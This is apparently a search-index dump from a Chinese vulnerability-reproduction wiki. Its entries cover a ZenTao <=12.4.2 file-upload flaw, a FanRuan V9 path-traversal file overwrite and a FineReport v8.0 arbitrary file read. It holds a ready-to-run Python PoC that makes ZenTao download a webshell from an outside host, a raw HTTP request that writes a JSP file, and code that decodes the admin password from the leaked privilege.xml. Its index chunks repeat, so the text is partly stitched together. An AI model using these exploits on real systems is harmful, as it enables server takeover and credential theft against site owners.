\u9996\u5148\u5148\u4e0a\u4f20\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\uff0c\u53ef\u4ee5\u662fFTP\u4e5f\u53ef\u4ee5\u662fHTTP \u4f8b\u5982\u6211\u4e0a\u4f20\u7684\u6587\u4ef6URL\u4e3a** http://peiqi.tech/SHELL.php ** http://peiqi.tech/SHELL.php | base64\u52a0\u5bc6 HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw \u8bf7\u6c42\u5730\u5740\u5219\u4e3a http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw \u4e0b\u8f7d\u7684\u76ee\u5f55\u5730\u5740\u4e3a**zentaopms\\www\\data\\client\\1** [!NOTE] \u76ee\u5f55\u4e3aversion\u540d\u79f0 \u6210\u529f\u4e0a\u4f20webshell \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u4f7f\u7528\u9700\u8981\u62e5\u6709\u540e\u53f0Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: zentao version <= 12.4.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CNVD-C-2020-121325.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(\u6076\u610f\u6587\u4ef6\u5730\u5740) \\033 [0m' ) print ( '+ \\033 [36mZentaosid >>> xxxxxxxxxxxxxx(cookie\u5b57\u6bb5) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . get ( url = version_url , timeout = 20 , headers = headers ) version = json . loads ( response . text )[ 'version' ] print ( \" \\033 [32m[o] \u7985\u9053\u7248\u672c\u4e3a: {} \\033 [0m\" . format ( version )) except Exception as e : print ( \" \\033 [31m[x] \u83b7\u53d6\u7248\u672c\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , shell_url , zentaosid ): options = shell_url . split ( \"://\" ) if options [ 0 ] == \"http\" : shell_url = \"HTTP://\" + options [ 1 ] elif options [ 0 ] == \"ftp\" : shell_url = \"ftp://\" + options [ 1 ] else : print ( \" \\033 [31m[x] \u8bf7\u4f7f\u7528\u6b63\u786e\u7684\u8bf7\u6c42\u5730\u5740 \\033 [0m\" ) sys . exit ( 0 ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"zentaosid= {} \" . format ( zentaosid ) } shell_url_base = str (( base64 . b64encode ( shell_url . encode ( 'utf-8' ))), 'utf-8' ) vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link= {} \" . format ( shell_url_base ) print ( \" \\033 [32m[o] \u8bf7\u6c42\u6f0f\u6d1eurl\uff1a {} \\033 [0m\" . format ( vuln_url )) try : response = requests . get ( url = vuln_url , timeout = 20 , headers = headers ) if \"\u4fdd\u5b58\u6210\u529f\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u5199\u5165Webshell\uff0cURL\u5730\u5740\u4e3a\uff1a {} /www/data/client/test/Webshell_name.php \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u6076\u610f\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u6076\u610f\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) shell_url = str ( input ( \" \\033 [35mShell >>> \\033 [0m\" )) zentaosid = str ( input ( \" \\033 [35mZentaosid >>> \\033 [0m\" )) POC_1 ( target_url ) POC_2 ( target_url , shell_url , zentaosid )","title":"\u7985\u9053 \u5c0f\u4e8e12.4.2 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CNVD-C-2020-121325"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/#\u7985\u9053-\u5c0f\u4e8e1242-\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e-cnvd-c-2020-121325","text":"","title":"\u7985\u9053 \u5c0f\u4e8e12.4.2 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CNVD-C-2020-121325"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u767e\u5ea6\u4e91\u5b89\u5168\u56e2\u961f\u76d1\u6d4b\u5230\u7985\u9053\u5b98\u65b9\u53d1\u5e03\u4e86\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCNVD-C-2020-121325\uff0c\u6f0f\u6d1e\u5f71\u54cd\u7985\u9053<=12.4.2\u7248\u672c\u3002\u767b\u9646\u7ba1\u7406\u540e\u53f0\u7684\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7fopen/fread/fwrite\u65b9\u6cd5\u8bfb\u53d6\u6216\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\uff0c\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u4ee5\u8bfb\u53d6\u76ee\u6807\u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u6216\u83b7\u5f97\u7cfb\u7edf\u7ba1\u7406\u6743\u9650\u3002\u6211\u4eec\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u4e86\u590d\u73b0\u548c\u5206\u6790\uff0c\u7531\u4e8e\u9700\u8981\u767b\u5f55\u540e\u53f0\u624d\u53ef\u4ee5\u5229\u7528\uff0c\u5b9e\u9645\u98ce\u9669\u76f8\u5bf9\u8f83\u4f4e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7985\u9053\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u7985\u9053 <= 12.4.2\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/#\u73af\u5883\u642d\u5efa","text":"\u767e\u5ea6\u4e0b12.4.2\u7684\u7985\u9053\u73af\u5883\u6309\u6b65\u9aa4\u5b89\u88c5\u4e0b\u8f7d\u5373\u53ef \u7985\u9053\u5b98\u65b9\u7f51\u7ad9 \u8c03\u7528\u63a5\u53e3\u67e5\u8be2\u7248\u672c\u4fe1\u606f http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/#\u6f0f\u6d1e\u590d\u73b0","text":"[!NOTE] \u6f0f\u6d1e\u89e6\u53d1\u9700\u8981\u540e\u53f0\u6743\u9650 \u6839\u636e\u6f0f\u6d1e\u63cf\u8ff0\u67e5\u770b\u4fee\u6539\u540e\u7684\u4ee3\u7801\u7247\u6bb5 \u4fee\u6539\u524d public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } \u4fee\u6539\u540e public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } \u8fd9\u91cc\u4f20\u5165\u7684\u53c2\u6570\u4e3a\u7248\u672c\u548clink\u5730\u5740\uff0c\u7136\u540ebase64\u89e3\u7801\uff0c\u6b63\u5219\u5224\u65ad\u662f\u5426\u4e3a**http**\u6216**https**\u534f\u8bae\uff0c\u8fd9\u91cc\u7684\u6b63\u5219\u8fc7\u6ee4\u5e76\u4e0d\u5b8c\u6574\uff0c\u6240\u4ee5\u53ef\u4ee5\u7ed5\u8fc7\u7528\u4e8e\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6 \u53ef\u4ee5\u5927\u5199**http**\u6216\u8bf7\u6c42**FTP**\u6765\u7ed5\u8fc7\u6b63\u5219 \u8ddf\u8fdb\u4e00\u4e0b**parent::downloadZipPackage**\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u8ddf\u7740\u6765\u5230**zentao\\module\\client\\model.php**\u6587\u4ef6\u4e2d public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } \u53ef\u4ee5\u7b80\u5355\u770b\u5230\u8fd9\u91cc\u83b7\u53d6link\u4f20\u5165\u7684\u6587\u4ef6\u540d\uff0c\u901a\u8fc7**fopen**\u6253\u5f00\u8be5\u6587\u4ef6\uff0c\u5199\u5165\u7985\u9053\u76ee\u5f55**www/data/client/version**\u4e2d \u67e5\u770b\u4e00\u4e0b\u6709\u6ca1\u6709\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u5730\u65b9 \u627e\u5230\u4e86**download**\u65b9\u6cd5\u8c03\u7528\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u70b9\uff0c\u6240\u4ee5\u6211\u4eec\u6709\u4e24\u79cd\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6\u7684\u65b9\u6cd5 http://xxx.xxx.xxx.xxx/www/client-download-[$version\u53c2\u6570]-[base64\u52a0\u5bc6\u540e\u7684\u6076\u610f\u6587\u4ef6\u5730\u5740].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$version\u53c2\u6570]&link=[base64\u52a0\u5bc6\u540e\u7684\u6076\u610f\u6587\u4ef6\u5730\u5740] \u9996\u5148\u5148\u4e0a\u4f20\u4e00\u4e2a\u6076\u610f\u6587\u4ef6\uff0c\u53ef\u4ee5\u662fFTP\u4e5f\u53ef\u4ee5\u662fHTTP \u4f8b\u5982\u6211\u4e0a\u4f20\u7684\u6587\u4ef6URL\u4e3a** http://peiqi.tech/SHELL.php ** http://peiqi.tech/SHELL.php | base64\u52a0\u5bc6 HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw \u8bf7\u6c42\u5730\u5740\u5219\u4e3a http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw \u4e0b\u8f7d\u7684\u76ee\u5f55\u5730\u5740\u4e3a**zentaopms\\www\\data\\client\\1** [!NOTE] \u76ee\u5f55\u4e3aversion\u540d\u79f0 \u6210\u529f\u4e0a\u4f20webshell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%20%E5%B0%8F%E4%BA%8E12.4.2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CNVD-C-2020-121325/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u4f7f\u7528\u9700\u8981\u62e5\u6709\u540e\u53f0Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: zentao version <= 12.4.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CNVD-C-2020-121325.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(\u6076\u610f\u6587\u4ef6\u5730\u5740) \\033 [0m' ) print ( '+ \\033 [36mZentaosid >>> xxxxxxxxxxxxxx(cookie\u5b57\u6bb5) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . get ( url = version_url , timeout = 20 , headers = headers ) version = json . loads ( response . text )[ 'version' ] print ( \" \\033 [32m[o] \u7985\u9053\u7248\u672c\u4e3a: {} \\033 [0m\" . format ( version )) except Exception as e : print ( \" \\033 [31m[x] \u83b7\u53d6\u7248\u672c\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , shell_url , zentaosid ): options = shell_url . split ( \"://\" ) if options [ 0 ] == \"http\" : shell_url = \"HTTP://\" + options [ 1 ] elif options [ 0 ] == \"ftp\" : shell_url = \"ftp://\" + options [ 1 ] else : print ( \" \\033 [31m[x] \u8bf7\u4f7f\u7528\u6b63\u786e\u7684\u8bf7\u6c42\u5730\u5740 \\033 [0m\" ) sys . exit ( 0 ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"zentaosid= {} \" . format ( zentaosid ) } shell_url_base = str (( base64 . b64encode ( shell_url . encode ( 'utf-8' ))), 'utf-8' ) vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link= {} \" . format ( shell_url_base ) print ( \" \\033 [32m[o] \u8bf7\u6c42\u6f0f\u6d1eurl\uff1a {} \\033 [0m\" . format ( vuln_url )) try : response = requests . get ( url = vuln_url , timeout = 20 , headers = headers ) if \"\u4fdd\u5b58\u6210\u529f\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u5199\u5165Webshell\uff0cURL\u5730\u5740\u4e3a\uff1a {} /www/data/client/test/Webshell_name.php \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u6076\u610f\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u6076\u610f\u6587\u4ef6\u4e0b\u8f7d\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) shell_url = str ( input ( \" \\033 [35mShell >>> \\033 [0m\" )) zentaosid = str ( input ( \" \\033 [35mZentaosid >>> \\033 [0m\" )) POC_1 ( target_url ) POC_2 ( target_url , shell_url , zentaosid )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"\u5e06\u8f6f V9 \u4efb\u610f\u6587\u4ef6\u8986\u76d6\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5e06\u8f6f V9 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8986\u76d6\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5e06\u8f6f V9 \u6f0f\u6d1e\u590d\u73b0 \u00b6 POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"<%out.println(\\\"Hello World!\\\");%>\",\"__CHARSET__\":\"UTF-8\"}","title":"\u5e06\u8f6f V9 \u4efb\u610f\u6587\u4ef6\u8986\u76d6\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u5e06\u8f6f-v9-\u4efb\u610f\u6587\u4ef6\u8986\u76d6\u6587\u4ef6\u4e0a\u4f20","text":"","title":"\u5e06\u8f6f V9 \u4efb\u610f\u6587\u4ef6\u8986\u76d6\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5e06\u8f6f V9 \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8986\u76d6\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5e06\u8f6f V9","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u590d\u73b0","text":"POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"<%out.println(\\\"Hello World!\\\");%>\",\"__CHARSET__\":\"UTF-8\"}","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/","text":"\u5e06\u8f6f\u62a5\u8868 v8.0 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CNVD-2018-04757 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 FineReport\u62a5\u8868\u8f6f\u4ef6\u662f\u4e00\u6b3e\u7eafJava\u7f16\u5199\u7684\uff0c\u96c6\u6570\u636e\u5c55\u793a(\u62a5\u8868)\u548c\u6570\u636e\u5f55\u5165(\u8868\u5355)\u529f\u80fd\u4e8e\u4e00\u8eab\u7684\u4f01\u4e1a\u7ea7web\u62a5\u8868\u5de5\u5177\u3002 FineReport v8.0\u7248\u672c\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u6f0f\u6d1e\u8bfb\u53d6\u7f51\u7ad9\u4efb\u610f\u6587\u4ef6\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] FineReport < v8.0 FOFA \u00b6 [!NOTE] body=\"isSupportForgetPwd\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a fr-applet-8.0.jar package com.fr.chart.web ; import com.fr.base.FRContext ; import com.fr.general.IOUtils ; import com.fr.stable.CodeUtils ; import com.fr.web.core.ActionNoSessionCMD ; import com.fr.web.utils.WebUtils ; import java.io.InputStream ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction () { } public void actionCMD ( HttpServletRequest var1 , HttpServletResponse var2 , String var3 ) throws Exception { String var4 = CodeUtils . cjkDecode ( WebUtils . getHTTPRequestParameter ( var1 , \"resourcepath\" )); if ( ! WebUtils . invalidResourcePath ( var4 )) { InputStream var5 = FRContext . getCurrentEnv (). readResource ( var4 ); String var6 = IOUtils . inputStream2String ( var5 ); var6 = var6 . replace ( '\\ufeff' , ' ' ); WebUtils . printAsString ( var2 , var6 ); } } public String getCMD () { return \"get_geo_json\" ; } } \u4f7f\u7528request\u5c06\u6587\u4ef6\u540d\u4f20\u5165 \u8c03\u7528cjkDecode\u51fd\u6570\u89e3\u5bc6\u6587\u4ef6\u540d \u4f7f\u7528invalidResourcePath\u51fd\u6570\u6821\u9a8c\u6587\u4ef6\u662f\u5426\u5b58\u5728 \u6700\u540e\u4f7f\u7528readResource\u51fd\u6570\u8bfb\u53d6\u6587\u4ef6\u4f20\u8f93\u5230\u6d4f\u89c8\u5668\u4e0a \u9ed8\u8ba4\u76ee\u5f55\u4e3aresources \u5176\u4e2d\u7684privilege.xml\u91cc\u9762\u5b58\u50a8\u4e86\u540e\u53f0\u7684\u7528\u6237\u540d\u5bc6\u7801 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <PrivilegeManager xmlVersion= \"20170715\" releaseVersion= \"8.0.0\" fsSystemManagerPassSet= \"true\" birthday= \"0\" male= \"false\" > <rootManagerName> <![CDATA[admin]]> </rootManagerName> <rootManagerPassword> <![CDATA[___00520017004e002b004100b7004200250023007f003d003d005400e4001c0057]]> </rootManagerPassword> <AP class= \"com.fr.privilege.providers.NoAuthenticationProvider\" /> <ForwardUrl> <![CDATA[${servletURL}?op=fr_platform]]> </ForwardUrl> <PVFILTER class= \"com.fr.fs.privilege.auth.BasePrivilegeFilter\" /> </PrivilegeManager> [!NOTE] \u52a0\u5bc6\u51fd\u6570 public static String passwordEncode ( String var0 ) { StringBuilder var1 = new StringBuilder (); var1 . append ( \"___\" ); if ( var0 == null ) { return var1 . toString (); } else { int var2 = 0 ; for ( int var3 = 0 ; var3 < var0 . length (); ++ var3 ) { if ( var2 == PASSWORD_MASK_ARRAY . length ) { var2 = 0 ; } int var4 = var0 . charAt ( var3 ) ^ PASSWORD_MASK_ARRAY [ var2 ] ; String var5 = Integer . toHexString ( var4 ); int var6 = var5 . length (); for ( int var7 = 0 ; var7 < 4 - var6 ; ++ var7 ) { var5 = \"0\" + var5 ; } var1 . append ( var5 ); ++ var2 ; } return var1 . toString (); } } [!NOTE] \u89e3\u5bc6\u51fd\u6570 public static String passwordDecode ( String var0 ) { if ( var0 != null && var0 . startsWith ( \"___\" )) { var0 = var0 . substring ( 3 ); StringBuilder var1 = new StringBuilder (); int var2 = 0 ; for ( int var3 = 0 ; var3 <= var0 . length () - 4 ; var3 += 4 ) { if ( var2 == PASSWORD_MASK_ARRAY . length ) { var2 = 0 ; } String var4 = var0 . substring ( var3 , var3 + 4 ); int var5 = Integer . parseInt ( var4 , 16 ) ^ PASSWORD_MASK_ARRAY [ var2 ] ; var1 . append (( char ) var5 ); ++ var2 ; } var0 = var1 . toString (); } return var0 ; } \u4f7f\u7528python\u5199\u51fa\u7684\u89e3\u5bc6\u4ee3\u7801\u4e3a cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #\u5bc6\u6587 PASSWORD_MASK_ARRAY = [ 19 , 78 , 10 , 15 , 100 , 213 , 43 , 23 ] #\u63a9\u7801 Password = \"\" cipher = cipher [ 3 :] #\u622a\u65ad\u4e09\u4f4d\u540e for i in range ( int ( len ( cipher ) / 4 )): c1 = int ( \"0x\" + cipher [ i * 4 :( i + 1 ) * 4 ], 16 ) c2 = c1 ^ PASSWORD_MASK_ARRAY [ i % 8 ] Password = Password + chr ( c2 ) print ( Password ) \u8fd9\u91cc\u4f7f\u7528\u4e0a\u9762\u8bb2\u8ff0\u7684\u539f\u7406\u8fdb\u884c\u590d\u73b0,\u8bbf\u95ee\u76ee\u6807 [!NOTE] \u8def\u5f84\u5206\u4e3a\u4e24\u79cd /WebReport/ReportServer ReportServer 